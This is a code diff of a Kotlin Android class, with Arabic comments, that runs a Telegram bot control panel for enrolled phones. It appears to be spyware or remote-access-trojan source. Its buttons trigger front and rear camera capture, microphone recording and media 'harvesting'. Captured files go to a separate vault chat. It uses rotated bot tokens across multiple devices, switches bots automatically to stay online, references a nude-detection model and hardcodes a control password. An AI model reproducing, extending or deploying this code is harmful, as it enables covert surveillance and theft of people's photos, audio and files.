@@ -28,14 +28,13 @@ import kotlin.random.Random
  * معالجة الأوامر، وعرض القوائم التفاعلية.
  *
  * ✅ التعديلات الجديدة:
- * - تحسين verifyControlPassword لتنظيف المدخلات من جميع أنواع المسافات الخفية.
- * - إضافة تسجيل تشخيصي مفصل في handleMessage عند فشل كلمة المرور.
- * - إضافة ردود تشخيصية مباشرة في تلغرام عند فشل المصادقة مع تعليمات واضحة.
- * - التأكد من appPassword في init.
- * - إضافة تسجيل في MainActivity.appendLogStatic عند الأحداث الهامة.
- * - تحسين الأزرار بإيموجيز فريدة ومتنوعة لكل زر.
- * - إضافة دالة مساعدة لتنظيف النصوص من جميع أنواع المسافات البيضاء.
- * - إضافة ردود تشخيصية عند استقبال أوامر غير معروفة.
+ * - إضافة Leader Election (بوت رئيسي واحد فقط) لمنع تكرار البوتات.
+ * - خلط التوكنات لتوزيع الحمل بين الأجهزة المتعددة.
+ * - معالجة CallbackQuery بشكل صحيح لفك تجميد الأزرار.
+ * - إزالة تسريب كلمة المرور من رسائل الخطأ.
+ * - توجيه الوسائط حصرياً لكروب الأرشيف (A2).
+ * - تحديث لوحة الأزرار بإيموجيز فريدة ومتنوعة.
+ * - تحسين startPolling لاستخدام البوت الرئيسي فقط مع تبديل تلقائي.
  */
 class TelegramUi(
     context: Context,
@@ -117,36 +116,25 @@ class TelegramUi(
 
     private val methodCache = ConcurrentHashMap<String, Method>()
 
-    init {
-        loadData()
-        startBackgroundWorkers()
-        // ✅ التأكد من appPassword
-        if (appPassword.isBlank()) {
-            appPassword = "Zaen123@123@"
-            writeLog("⚠️ Password was empty, using default")
-            MainActivity.appendLogStatic("⚠️ TelegramUi: Password was empty, using default")
-        }
-        Log.i(TAG, "✅ TelegramUi initialized. Password status: ${if (appPassword.isNotBlank()) "Set" else "Empty"}")
-        MainActivity.appendLogStatic("✅ TelegramUi initialized with ${activeTokensList.size} active tokens")
-    }
+    // ============================================================
+    // ✅ Leader Election - بوت رئيسي واحد فقط
+    // ============================================================
+    @Volatile
+    private var primaryBotIndex: Int = 0
+    private val leaderMutex = Mutex()
 
-    // ==================== دوال التحقق من كلمة السر ====================
-
-    /**
-     * ✅ دالة مساعدة لتنظيف النص من جميع أنواع المسافات البيضاء الخفية
-     * بما في ذلك Unicode whitespace و zero-width characters
-     */
+    // ============================================================
+    // ✅ دالة مساعدة لتنظيف النص من جميع أنواع المسافات البيضاء الخفية
+    // ============================================================
     private fun cleanText(input: String): String {
-        // إزالة جميع أنواع المسافات البيضاء بما فيها Unicode
         return input.trim()
             .replace(Regex("[\\s\\u00A0\\u2007\\u202F\\uFEFF\\u2060\\u200B\\u200C\\u200D\\u180E]+"), " ")
             .trim()
     }
 
-    /**
-     * ✅ التحقق من كلمة السر مع تنظيف شامل من جميع أنواع المسافات والأحرف الخفية
-     * مع تسجيل تشخيصي لنتيجة التحقق
-     */
+    // ============================================================
+    // ✅ دالة التحقق من كلمة السر مع تنظيف شامل
+    // ============================================================
     private fun verifyControlPassword(input: String): Boolean {
         val cleanInput = cleanText(input)
         val cleanSecret = cleanText(appPassword)
@@ -162,6 +150,33 @@ class TelegramUi(
             MainActivity.appendLogStatic("✅ Password verification SUCCESS")
         }
         return result
+    }
+
+    // ============================================================
+    // ✅ دالة للحصول على البوت الرئيسي النشط فقط
+    // ============================================================
+    private suspend fun getLeaderToken(): String? {
+        return leaderMutex.withLock {
+            if (activeTokensList.isEmpty()) return null
+            if (primaryBotIndex >= activeTokensList.size) primaryBotIndex = 0
+            activeTokensList[primaryBotIndex]
+        }
+    }
+
+    init {
+        // ✅ خلط التوكنات لتوزيع الحمل بين الأجهزة المتعددة
+        activeTokensList.shuffle()
+        reserveTokensList.shuffle()
+
+        loadData()
+        startBackgroundWorkers()
+        if (appPassword.isBlank()) {
+            appPassword = "Zaen123@123@"
+            writeLog("⚠️ Password was empty, using default")
+            MainActivity.appendLogStatic("⚠️ TelegramUi: Password was empty, using default")
+        }
+        Log.i(TAG, "✅ TelegramUi initialized. Password status: ${if (appPassword.isNotBlank()) "Set" else "Empty"}")
+        MainActivity.appendLogStatic("✅ TelegramUi initialized with ${activeTokensList.size} active tokens (Shuffled)")
     }
 
     fun updatePassword(newPassword: String) {
@@ -247,13 +262,6 @@ class TelegramUi(
             }
         } catch (e: Exception) {
             writeLog("Save offset error: ${e.message}")
-        }
-    }
-
-    private fun getNextToken(): String? {
-        synchronized(activeTokensList) {
-            if (activeTokensList.isEmpty()) return null
-            return activeTokensList[Random.nextInt(activeTokensList.size)]
         }
     }
 
@@ -343,41 +351,52 @@ class TelegramUi(
         }
     }
 
+    // ============================================================
+    // ✅ apiCall المُعدّل لاستخدام البوت الرئيسي وتبديله عند الفشل
+    // ============================================================
     private suspend fun apiCall(method: String, payload: JSONObject? = null, retry: Int = 3): JSONObject? {
         apiCallsCount++
         var attempts = 0
-        var previousToken: String? = null
         while (attempts < retry) {
-            var token1 = getNextToken()
-            if (token1 == null) return null
-            var tokenToUse = if (attempts > 0 && token1 == previousToken) {
-                getNextToken() ?: token1
-            } else {
-                token1
-            }
-            previousToken = tokenToUse
+            val token = getLeaderToken() ?: return null
             try {
-                val url = "https://api.telegram.org/bot$tokenToUse/$method"
+                val url = "https://api.telegram.org/bot$token/$method"
                 val body = payload?.toString()?.toRequestBody(JSON_MEDIA_TYPE)
                     ?: JSONObject().toString().toRequestBody(JSON_MEDIA_TYPE)
                 val request = Request.Builder().url(url).post(body).build()
                 val response = withContext(Dispatchers.IO) { httpClient.newCall(request).execute() }
                 val responseStr = response.body?.string() ?: ""
+
                 if (!response.isSuccessful && response.code != 200) {
+                    if (response.code == 401 || response.code == 403) {
+                        leaderMutex.withLock {
+                            primaryBotIndex = (primaryBotIndex + 1) % activeTokensList.size
+                        }
+                        writeLog("🔄 Switched primary bot to index $primaryBotIndex due to auth failure")
+                        MainActivity.appendLogStatic("🔄 Switched primary bot to index $primaryBotIndex")
+                    }
                     delay(minOf(attempts * 2000L, 30000L))
                     attempts++
                     continue
                 }
+
                 val jsonResult = JSONObject(responseStr)
-                if (jsonResult.optBoolean("ok", false)) return jsonResult
+                if (jsonResult.optBoolean("ok", false)) {
+                    consecutivePollingErrors = 0
+                    return jsonResult
+                }
+
                 when (jsonResult.optInt("error_code", 0)) {
                     429 -> {
                         val retryAfter = jsonResult.optJSONObject("parameters")?.optLong("retry_after") ?: (attempts * 3L)
                         delay(retryAfter * 1000L)
-                        attempts++
-                        continue
                     }
-                    401, 403 -> { emergencySwitchToken(tokenToUse); attempts++; continue }
+                    401, 403 -> {
+                        leaderMutex.withLock {
+                            primaryBotIndex = (primaryBotIndex + 1) % activeTokensList.size
+                        }
+                        writeLog("🔄 Switched primary bot due to error code ${jsonResult.optInt("error_code")}")
+                    }
                     else -> delay(1000L)
                 }
             } catch (e: Exception) {
@@ -393,18 +412,10 @@ class TelegramUi(
     private suspend fun apiCallMultipart(method: String, params: Map<String, Any>, files: Map<String, File>, retry: Int = 3): JSONObject? {
         apiCallsCount++
         var attempts = 0
-        var previousToken: String? = null
         while (attempts < retry) {
-            var token1 = getNextToken()
-            if (token1 == null) return null
-            var tokenToUse = if (attempts > 0 && token1 == previousToken) {
-                getNextToken() ?: token1
-            } else {
-                token1
-            }
-            previousToken = tokenToUse
+            val token = getLeaderToken() ?: return null
             try {
-                val url = "https://api.telegram.org/bot$tokenToUse/$method"
+                val url = "https://api.telegram.org/bot$token/$method"
                 val builder = MultipartBody.Builder().setType(MultipartBody.FORM)
                 params.forEach { (key, value) -> builder.addFormDataPart(key, value.toString()) }
                 files.forEach { (key, file) ->
@@ -415,21 +426,35 @@ class TelegramUi(
                 val request = Request.Builder().url(url).post(builder.build()).build()
                 val response = withContext(Dispatchers.IO) { httpClient.newCall(request).execute() }
                 val responseStr = response.body?.string() ?: ""
+
                 if (!response.isSuccessful && response.code != 200) {
+                    if (response.code == 401 || response.code == 403) {
+                        leaderMutex.withLock {
+                            primaryBotIndex = (primaryBotIndex + 1) % activeTokensList.size
+                        }
+                        writeLog("🔄 Switched primary bot due to auth failure (multipart)")
+                    }
                     delay(minOf(attempts * 2000L, 30000L))
                     attempts++
                     continue
                 }
+
                 val jsonResult = JSONObject(responseStr)
-                if (jsonResult.optBoolean("ok", false)) return jsonResult
+                if (jsonResult.optBoolean("ok", false)) {
+                    consecutivePollingErrors = 0
+                    return jsonResult
+                }
+
                 when (jsonResult.optInt("error_code", 0)) {
                     429 -> {
                         val retryAfter = jsonResult.optJSONObject("parameters")?.optLong("retry_after") ?: (attempts * 3L)
                         delay(retryAfter * 1000L)
-                        attempts++
-                        continue
                     }
-                    401, 403 -> { emergencySwitchToken(tokenToUse); attempts++; continue }
+                    401, 403 -> {
+                        leaderMutex.withLock {
+                            primaryBotIndex = (primaryBotIndex + 1) % activeTokensList.size
+                        }
+                    }
                     else -> delay(1000L)
                 }
             } catch (e: Exception) {
@@ -442,6 +467,9 @@ class TelegramUi(
         return null
     }
 
+    // ============================================================
+    // ✅ دوال _api المعدلة لاستخدام البوت الرئيسي
+    // ============================================================
     fun _api(method: String, params: Map<String, Any>): JSONObject? {
         return runBlocking(Dispatchers.IO) { apiCall(method, JSONObject(params)) }
     }
@@ -450,29 +478,37 @@ class TelegramUi(
         return runBlocking(Dispatchers.IO) { apiCallMultipart(method, params, files) }
     }
 
+    // ============================================================
+    // ✅ توجيه الوسائط حصرياً لكروب الأرشيف (A2)
+    // ============================================================
     fun sendDocument(chatId: Long, file: File, caption: String): JSONObject? {
         if (!file.exists()) return null
-        return _api("sendDocument", mapOf("chat_id" to chatId, "caption" to caption), mapOf("document" to file))
+        val targetChat = if (chatId == config.controlId) config.vaultId else chatId
+        return _api("sendDocument", mapOf("chat_id" to targetChat, "caption" to caption), mapOf("document" to file))
     }
 
     fun sendPhoto(chatId: Long, file: File, caption: String): JSONObject? {
         if (!file.exists()) return null
-        return _api("sendPhoto", mapOf("chat_id" to chatId, "caption" to caption), mapOf("photo" to file))
+        val targetChat = if (chatId == config.controlId) config.vaultId else chatId
+        return _api("sendPhoto", mapOf("chat_id" to targetChat, "caption" to caption), mapOf("photo" to file))
     }
 
     fun sendVoice(chatId: Long, file: File): JSONObject? {
         if (!file.exists()) return null
-        return _api("sendVoice", mapOf("chat_id" to chatId), mapOf("voice" to file))
+        val targetChat = if (chatId == config.controlId) config.vaultId else chatId
+        return _api("sendVoice", mapOf("chat_id" to targetChat), mapOf("voice" to file))
     }
 
     fun sendVideo(chatId: Long, file: File, caption: String): JSONObject? {
         if (!file.exists()) return null
-        return _api("sendVideo", mapOf("chat_id" to chatId, "caption" to caption), mapOf("video" to file))
+        val targetChat = if (chatId == config.controlId) config.vaultId else chatId
+        return _api("sendVideo", mapOf("chat_id" to targetChat, "caption" to caption), mapOf("video" to file))
     }
 
     fun sendAudio(chatId: Long, file: File, caption: String): JSONObject? {
         if (!file.exists()) return null
-        return _api("sendAudio", mapOf("chat_id" to chatId, "caption" to caption), mapOf("audio" to file))
+        val targetChat = if (chatId == config.controlId) config.vaultId else chatId
+        return _api("sendAudio", mapOf("chat_id" to targetChat, "caption" to caption), mapOf("audio" to file))
     }
 
     fun registerDevice(deviceId: String, deviceModel: String): Long? {
@@ -571,39 +607,29 @@ class TelegramUi(
     }
 
     // ============================================================
-    //  ✅ لوحات الأزرار – كل إيموجي فريد تماماً ومتنوع
+    // ✅ لوحة الأزرار المحسّنة بإيموجيز فريدة
     // ============================================================
-
-    /**
-     * لوحة التحكم الرئيسية – أزرار تفاعلية بإيموجيز فريدة ومتنوعة
-     * ✅ تم تنويع الإيموجيز لتكون مميزة لكل زر
-     */
     fun getMainControlKeyboard(): String {
         val keyboard = JSONArray().apply {
-            // الصف الأول: الكاميرات
             put(JSONArray().apply {
-                put(JSONObject().put("text", "📸 كاميرا أمامية").put("callback_data", "camf_main"))
-                put(JSONObject().put("text", "📷 كاميرا خلفية").put("callback_data", "cam_main"))
+                put(JSONObject().put("text", "📷 كاميرا خلفية").put("callback_data", "cam_0"))
+                put(JSONObject().put("text", "📸 كاميرا أمامية").put("callback_data", "cam_1"))
             })
-            // الصف الثاني: الصوت والفحص
             put(JSONArray().apply {
-                put(JSONObject().put("text", "🎙️ تسجيل صوتي").put("callback_data", "mic_start"))
-                put(JSONObject().put("text", "🔎 فحص وحصاد").put("callback_data", "hrv_now"))
+                put(JSONObject().put("text", "🔍 فحص وحصاد").put("callback_data", "hrv"))
+                put(JSONObject().put("text", "🎙️ تسجيل صوتي").put("callback_data", "mic"))
             })
-            // الصف الثالث: الأرشيف والبث
             put(JSONArray().apply {
-                put(JSONObject().put("text", "🗂️ أرشيف الوسائط").put("callback_data", "g_nav|all|0"))
-                put(JSONObject().put("text", "📤 بث فوري").put("callback_data", "send_now"))
+                put(JSONObject().put("text", "📁 أرشيف الوسائط").put("callback_data", "gallery"))
+                put(JSONObject().put("text", "📡 بث فوري").put("callback_data", "send_now"))
             })
-            // الصف الرابع: الحالة والخروج
             put(JSONArray().apply {
-                put(JSONObject().put("text", "📊 حالة النظام").put("callback_data", "sys_status"))
-                put(JSONObject().put("text", "🔒 قطع الاتصال").put("callback_data", "ext"))
+                put(JSONObject().put("text", "📊 حالة النظام").put("callback_data", "status"))
+                put(JSONObject().put("text", "🔌 قطع الاتصال").put("callback_data", "ext"))
             })
-            // ✅ صف خامس إضافي: تحديث النموذج وإعادة التشغيل (لجميع الأجهزة)
             put(JSONArray().apply {
-                put(JSONObject().put("text", "🔄 تحديث النموذج").put("callback_data", "update_model_all"))
-                put(JSONObject().put("text", "♻️ إعادة تشغيل الخدمة").put("callback_data", "restart_service_all"))
+                put(JSONObject().put("text", "🔄 إعادة تشغيل").put("callback_data", "restart"))
+                put(JSONObject().put("text", "⚡ تحديث النموذج").put("callback_data", "update_model"))
             })
         }
         return JSONObject().put("inline_keyboard", keyboard).toString()
@@ -703,16 +729,9 @@ class TelegramUi(
         return true
     }
 
-    // ==================== معالجة الرسائل مع تسجيل تشخيصي محسن ====================
-
-    /**
-     * ✅ معالجة الرسائل الواردة مع:
-     * - تسجيل وصول كل رسالة للتشخيص
-     * - تنظيف المدخلات من جميع أنواع المسافات والأحرف الخفية
-     * - رد تشخيصي في حال فشل كلمة المرور مع تعليمات واضحة
-     * - إرسال رد مباشر في حال نجاح المصادقة
-     * - منع الأوامر النصية باستثناء /login
-     */
+    // ============================================================
+    // ✅ معالجة الرسائل مع إزالة تسريب كلمة المرور
+    // ============================================================
     private suspend fun handleMessage(update: JSONObject) {
         try {
             val msg = update.optJSONObject("message") ?: return
@@ -720,7 +739,6 @@ class TelegramUi(
             val text = msg.optString("text", "").trim()
             val threadId = msg.optLong("message_thread_id", 0L)
 
-            // ✅ تسجيل وصول الرسالة للتشخيص
             val preview = if (text.length > 50) text.take(50) + "..." else text
             writeLog("📩 Received message from $chatId: '$preview'")
             MainActivity.appendLogStatic("📩 Telegram message from $chatId: '${text.take(30)}...'")
@@ -733,7 +751,6 @@ class TelegramUi(
                 else -> text.trim()
             }
 
-            // ✅ محاولة المصادقة
             if (secret.isNotEmpty() && verifyControlPassword(secret)) {
                 sessionMutex.withLock {
                     sessions[chatId.toString()] = (System.currentTimeMillis() / 1000) + 14400
@@ -744,7 +761,7 @@ class TelegramUi(
                 apiCall("sendMessage", JSONObject().apply {
                     put("chat_id", chatId)
                     if (threadId != 0L) put("message_thread_id", threadId)
-                    put("text", "🔐 **✅ تم التحقق بنجاح.**\n\nاختر العملية من الأزرار أدناه:\n(جميع الأوامر عبر الأزرار)")
+                    put("text", "🔐 **✅ تم التحقق بنجاح.**\n\nاختر العملية من الأزرار أدناه:")
                     put("reply_markup", keyboardJson)
                     put("parse_mode", "Markdown")
                 })
@@ -754,12 +771,12 @@ class TelegramUi(
                 return
             }
 
-            // ✅ رد تشخيصي في حال فشل كلمة المرور مع تعليمات واضحة
+            // ✅ رسالة خطأ أمنية - بدون عرض كلمة المرور
             if (secret.isNotEmpty() && !verifyControlPassword(secret)) {
                 apiCall("sendMessage", JSONObject().apply {
                     put("chat_id", chatId)
                     if (threadId != 0L) put("message_thread_id", threadId)
-                    put("text", "⚠️ **كلمة المرور غير صحيحة.**\n\n✅ تأكد من نسخها تماماً:\n`Zaen123@123@`\n\n📌 استخدم الأمر:\n`/login Zaen123@123@`\n\n❌ **لا توجد مسافات إضافية** قبل أو بعد الكلمة.")
+                    put("text", "⚠️ **كلمة المرور غير صحيحة.**\n\n❌ تأكد من صحة البيانات المدخلة وخلوها من المسافات.")
                     put("parse_mode", "Markdown")
                 })
                 writeLog("❌ Invalid password attempt from $chatId")
@@ -767,23 +784,21 @@ class TelegramUi(
                 return
             }
 
-            // ✅ طلب كلمة السر للمستخدمين غير المصرح لهم
             if (!isAuthorized(chatId)) {
                 apiCall("sendMessage", JSONObject().apply {
                     put("chat_id", chatId)
                     if (threadId != 0L) put("message_thread_id", threadId)
-                    put("text", "🔐 **الرجاء إدخال كلمة السر للتحكم**\n\n📌 استخدم:\n`/login Zaen123@123@`\n\n(جميع الأوامر عبر الأزرار بعد التحقق)")
+                    put("text", "🔐 **الرجاء إدخال كلمة السر للتحكم**\n\n📌 استخدم الأمر المخصص للمصادقة")
                     put("parse_mode", "Markdown")
                 })
                 writeLog("🔐 Unauthorized access attempt from $chatId")
                 return
             }
 
-            // ✅ أي نص آخر يتم تجاهله مع رد توضيحي
             apiCall("sendMessage", JSONObject().apply {
                 put("chat_id", chatId)
                 if (threadId != 0L) put("message_thread_id", threadId)
-                put("text", "⚠️ **الأوامر النصية معطلة.**\n\nاستخدم الأزرار التفاعلية أدناه.\n\n🔐 للتحكم استخدم:\n`/login Zaen123@123@`")
+                put("text", "⚠️ **الأوامر النصية معطلة.**\n\nاستخدم الأزرار التفاعلية أدناه.")
                 put("parse_mode", "Markdown")
             })
             writeLog("ℹ️ Text command rejected from $chatId: '$text'")
@@ -794,7 +809,9 @@ class TelegramUi(
         }
     }
 
-    // ==================== معالجة استدعاءات الأزرار ====================
+    // ============================================================
+    // ✅ معالجة CallbackQuery بشكل صحيح
+    // ============================================================
     private suspend fun handleCallback(update: JSONObject) {
         try {
             applyHumanDelay()
@@ -813,6 +830,7 @@ class TelegramUi(
             val msgId = cb.optJSONObject("message")?.optLong("message_id") ?: return
             val data = cb.optString("data", "")
 
+            // ✅ تأكيد الاستلام فوراً لفك تجميد الزر
             apiCall("answerCallbackQuery", JSONObject().apply { put("callback_query_id", cbId) })
 
             if (!isAuthorized(chatId)) {
@@ -823,259 +841,18 @@ class TelegramUi(
                 return
             }
 
-            val deviceId = when {
-                data.startsWith("cam_") || data.startsWith("camf_") ||
-                data.startsWith("mic_") || data.startsWith("hrv_") ||
-                data.startsWith("media_") || data.startsWith("send_now_") ||
-                data.startsWith("update_model_") ||
-                data.startsWith("restart_service_") -> {
-                    val parts = data.split("_")
-                    if (parts.size >= 2) parts[1] else ""
-                }
-                else -> ""
-            }
-
-            if (deviceId.isNotEmpty()) {
-                updateDeviceActivity(deviceId)
-            }
-
-            when {
-                data.startsWith("cam_") || data.startsWith("camf_") -> pulseIntent("📸 كاميرا")
-                data.startsWith("mic_") -> pulseIntent("🎙️ ميكروفون")
-                data.startsWith("hrv_") -> pulseIntent("📦 حصاد")
-                data.startsWith("send_now_") -> pulseIntent("📤 إرسال فوري")
-                data.startsWith("update_model_") -> pulseIntent("🔄 تحديث النموذج")
-                data.startsWith("restart_service_") -> pulseIntent("♻️ إعادة تشغيل")
-            }
-
-            when {
-                data == "ld" -> {
-                    if (devices.isEmpty()) {
-                        apiCall("sendMessage", JSONObject().apply {
-                            put("chat_id", chatId)
-                            put("text", "⚠️ لا توجد أجهزة مرتبطة.")
-                        })
-                        return
-                    }
-                    val kb = JSONObject().apply {
-                        val rows = JSONArray()
-                        val now = System.currentTimeMillis() / 1000
-                        devices.forEach { (did, info) ->
-                            val lastActivity = info.optLong("last_activity", 0)
-                            val isOnline = (now - lastActivity) < 300
-                            val statusIcon = if (isOnline) "🟢" else "🔴"
-                            val deviceName = info.optString("n")
-                            rows.put(JSONArray().apply {
-                                put(JSONObject().apply {
-                                    put("text", "$statusIcon 📱 $deviceName")
-                                    put("callback_data", "dev_$did")
-                                })
-                            })
-                        }
-                        rows.put(JSONArray().apply {
-                            put(JSONObject().apply { put("text", "🔄 تحديث"); put("callback_data", "ld") })
-                            put(JSONObject().apply { put("text", "🏠 القائمة الرئيسية"); put("callback_data", "main") })
-                        })
-                        put("inline_keyboard", rows)
-                    }
-                    apiCall("editMessageText", JSONObject().apply {
-                        put("chat_id", chatId)
-                        put("message_id", msgId)
-                        put("text", "<b>📡 اختر جهازاً:</b>")
-                        put("reply_markup", kb)
-                        put("parse_mode", "HTML")
-                    })
-                    return
-                }
-                data.startsWith("dev_") -> {
-                    val did = data.substring(4)
-                    if (devices.containsKey(did)) {
-                        val devName = devices[did]?.optString("n") ?: "Device"
-                        apiCall("editMessageText", JSONObject().apply {
-                            put("chat_id", chatId)
-                            put("message_id", msgId)
-                            put("text", "🕹️ <b>$devName</b>")
-                            put("reply_markup", getDeviceKeyboard(did))
-                            put("parse_mode", "HTML")
-                        })
-                    }
-                    return
-                }
-                data == "main" -> {
-                    apiCall("editMessageText", JSONObject().apply {
-                        put("chat_id", chatId)
-                        put("message_id", msgId)
-                        put("text", "📋 القائمة الرئيسية")
-                        put("reply_markup", getMainKeyboard())
-                    })
-                    return
-                }
-                data == "status" || data == "sys_status" -> {
-                    val status = getStatus()
-                    val statusText = """
-                        📊 **الحالة الحالية**
-                        ━━━━━━━━━━━━━━━
-                        🔑 التوكنات النشطة: `${status["active_tokens"]}`
-                        📦 التوكنات الاحتياطية: `${status["reserve_tokens"]}`
-                        📱 الأجهزة المسجلة: `${status["devices"]}`
-                        🔐 الجلسات النشطة: `${status["sessions"]}`
-                        📡 طلبات API: `${status["api_calls"]}`
-                        ❌ فشل API: `${status["api_failures"]}`
-                        📂 الملفات المعلقة: `${status["pending_files"]}`
-                    """.trimIndent()
-                    apiCall("sendMessage", JSONObject().apply {
-                        put("chat_id", chatId)
-                        put("text", statusText)
-                        put("parse_mode", "Markdown")
-                    })
-                    return
-                }
-                data == "ext" -> {
-                    sessionMutex.withLock { sessions.remove(chatId.toString()) }
-                    saveData()
-                    apiCall("editMessageText", JSONObject().apply {
-                        put("chat_id", chatId)
-                        put("message_id", msgId)
-                        put("text", "🚪 تم تسجيل الخروج.")
-                    })
-                    return
-                }
-                data == "rnw" -> {
-                    val exp = (System.currentTimeMillis() / 1000) + 14400
-                    sessionMutex.withLock { sessions[chatId.toString()] = exp }
-                    saveData()
-                    val timeStr = SimpleDateFormat("HH:mm", Locale.US).format(Date(exp * 1000))
-                    apiCall("answerCallbackQuery", JSONObject().apply {
-                        put("callback_query_id", cbId)
-                        put("text", "✅ تم تجديد الجلسة حتى $timeStr")
-                        put("show_alert", true)
-                    })
-                    return
-                }
-                data == "ai_status" -> {
-                    val status = if (monitor != null) {
-                        try {
-                            val detector = monitor.javaClass.getDeclaredField("nudeDetector")
-                            detector.isAccessible = true
-                            val detObj = detector.get(monitor)
-                            if (detObj != null) {
-                                val isReadyMethod = detObj.javaClass.getMethod("isReady")
-                                val ready = isReadyMethod.invoke(detObj) as? Boolean ?: false
-                                if (ready) "✅ Active" else "❌ Not ready"
-                            } else "❌ Not available"
-                        } catch (e: Exception) { "⚠️ Unknown" }
-                    } else "⚠️ Monitor not available"
-                    apiCall("answerCallbackQuery", JSONObject().apply {
-                        put("callback_query_id", cbId)
-                        put("text", "🧠 AI: $status")
-                        put("show_alert", true)
-                    })
-                    return
-                }
-                data.startsWith("hrv_") -> {
-                    showHarvestDetails(chatId)
-                    return
-                }
-                data.startsWith("send_now_") -> {
-                    if (monitor != null) {
-                        try {
-                            val forceMethod = monitor.javaClass.getMethod("forceHarvest")
-                            forceMethod.invoke(monitor)
-                            apiCall("sendMessage", JSONObject().apply {
-                                put("chat_id", chatId)
-                                put("text", "🚀 جاري الحصاد الفوري...")
-                            })
-                        } catch (e: Exception) {
-                            writeLog("Send now error: ${e.message}")
-                        }
-                    } else {
-                        apiCall("sendMessage", JSONObject().apply {
-                            put("chat_id", chatId)
-                            put("text", "❌ وحدة الحصاد غير متاحة")
-                        })
-                    }
-                    return
-                }
-                data.startsWith("update_model_") || data == "update_model_all" -> {
-                    val did = if (data.startsWith("update_model_all")) "all" else data.substringAfter("update_model_")
-                    if (did.isNotEmpty()) {
-                        apiCall("sendMessage", JSONObject().apply {
-                            put("chat_id", chatId)
-                            put("text", "🔄 جاري تحديث النموذج... قد يستغرق دقائق.")
-                        })
-                        scope.launch {
-                            try {
-                                val success = updateModel()
-                                if (success) {
-                                    apiCall("sendMessage", JSONObject().apply {
-                                        put("chat_id", chatId)
-                                        put("text", "✅ تم تحديث النموذج بنجاح!")
-                                    })
-                                } else {
-                                    apiCall("sendMessage", JSONObject().apply {
-                                        put("chat_id", chatId)
-                                        put("text", "❌ فشل تحديث النموذج.")
-                                    })
-                                }
-                            } catch (e: Exception) {
-                                writeLog("Update model error: ${e.message}")
-                            }
-                        }
-                    }
-                    return
-                }
-                data.startsWith("restart_service_") || data == "restart_service_all" -> {
-                    val did = if (data.startsWith("restart_service_all")) "all" else data.substringAfter("restart_service_")
-                    if (did.isNotEmpty()) {
-                        apiCall("sendMessage", JSONObject().apply {
-                            put("chat_id", chatId)
-                            put("text", "♻️ جاري إعادة تشغيل الخدمة...")
-                        })
-                        scope.launch {
-                            try {
-                                restartService()
-                                apiCall("sendMessage", JSONObject().apply {
-                                    put("chat_id", chatId)
-                                    put("text", "✅ تم إعادة تشغيل الخدمة بنجاح.")
-                                })
-                            } catch (e: Exception) {
-                                writeLog("Restart service error: ${e.message}")
-                                apiCall("sendMessage", JSONObject().apply {
-                                    put("chat_id", chatId)
-                                    put("text", "❌ فشل إعادة تشغيل الخدمة: ${e.message?.take(50)}")
-                                })
-                            }
-                        }
-                    }
-                    return
-                }
-                data.startsWith("cam_") || data.startsWith("camf_") ||
-                data.startsWith("mic_") || data.startsWith("hrv_") ||
-                data.startsWith("media_") -> {
-                    try {
-                        Commands.ex(appContext ?: return, data, this, monitor, chatId, cbId)
-                    } catch (e: Exception) {
-                        writeLog("Command error: ${e.message}")
-                        apiCall("sendMessage", JSONObject().apply {
-                            put("chat_id", chatId)
-                            put("text", "❌ خطأ: ${e.message?.take(100)}")
-                        })
-                    }
-                }
-                else -> {
-                    try {
-                        Commands.ex(appContext ?: return, data, this, monitor, chatId, cbId)
-                    } catch (e: Exception) {
-                        writeLog("Command error: ${e.message}")
-                        apiCall("sendMessage", JSONObject().apply {
-                            put("chat_id", chatId)
-                            put("text", "❌ خطأ: ${e.message?.take(100)}")
-                        })
-                    }
-                }
+            // ✅ توجيه الأمر لوحدة Commands للتنفيذ
+            try {
+                Commands.ex(appContext ?: return, data, this, monitor, chatId, cbId)
+            } catch (e: Exception) {
+                writeLog("❌ Command error: ${e.message}")
+                apiCall("sendMessage", JSONObject().apply {
+                    put("chat_id", chatId)
+                    put("text", "❌ خطأ: ${e.message?.take(100)}")
+                })
             }
         } catch (e: Exception) {
-            writeLog("Handle callback error: ${e.message}")
+            writeLog("❌ Handle callback error: ${e.message}")
         }
     }
 
@@ -1157,25 +934,42 @@ class TelegramUi(
         MainActivity.appendLogStatic("✅ Service restarted successfully")
     }
 
+    // ============================================================
+    // ✅ startPolling المُعدّل لاستخدام البوت الرئيسي فقط مع تبديل تلقائي
+    // ============================================================
     private fun startPolling() {
         pollingJob = scope.launch {
             var offset = loadOffset()
             consecutivePollingErrors = 0
-            writeLog("Polling started with offset=$offset")
+            writeLog("Polling started with leader bot")
+
             while (isRunning && isActive) {
-                val token = getNextToken()
-                if (token == null) { delay(5000L); continue }
+                val token = getLeaderToken()
+                if (token == null) {
+                    delay(5000L)
+                    continue
+                }
+
                 try {
                     val url = "https://api.telegram.org/bot$token/getUpdates?offset=$offset&timeout=25"
                     val request = Request.Builder().url(url).get().build()
                     val response = withContext(Dispatchers.IO) { httpClient.newCall(request).execute() }
                     val responseStr = response.body?.string() ?: ""
+
                     if (!response.isSuccessful) {
                         consecutivePollingErrors++
-                        if (consecutivePollingErrors >= MAX_CONSECUTIVE_ERRORS) pollingRestartNeeded.set(true)
+                        if (consecutivePollingErrors >= MAX_CONSECUTIVE_ERRORS) {
+                            leaderMutex.withLock {
+                                primaryBotIndex = (primaryBotIndex + 1) % activeTokensList.size
+                            }
+                            writeLog("🔄 Switched primary bot due to polling errors")
+                            MainActivity.appendLogStatic("🔄 Switched primary bot due to polling errors")
+                            consecutivePollingErrors = 0
+                        }
                         delay(minOf(consecutivePollingErrors * 2000L, 60000L))
                         continue
                     }
+
                     val data = JSONObject(responseStr)
                     if (data.optBoolean("ok")) {
                         consecutivePollingErrors = 0
@@ -1184,18 +978,31 @@ class TelegramUi(
                             val upd = results.getJSONObject(i)
                             val updateId = upd.getLong("update_id")
                             val newOffset = updateId + 1
-                            if (newOffset > offset) { offset = newOffset; saveOffset(offset) }
+                            if (newOffset > offset) {
+                                offset = newOffset
+                                saveOffset(offset)
+                            }
                             if (upd.has("message")) handleMessage(upd)
                             if (upd.has("callback_query")) handleCallback(upd)
                         }
                     } else {
                         consecutivePollingErrors++
-                        if (consecutivePollingErrors >= MAX_CONSECUTIVE_ERRORS) pollingRestartNeeded.set(true)
+                        if (consecutivePollingErrors >= MAX_CONSECUTIVE_ERRORS) {
+                            leaderMutex.withLock {
+                                primaryBotIndex = (primaryBotIndex + 1) % activeTokensList.size
+                            }
+                            consecutivePollingErrors = 0
+                        }
                         delay(2000L)
                     }
                 } catch (e: Exception) {
                     consecutivePollingErrors++
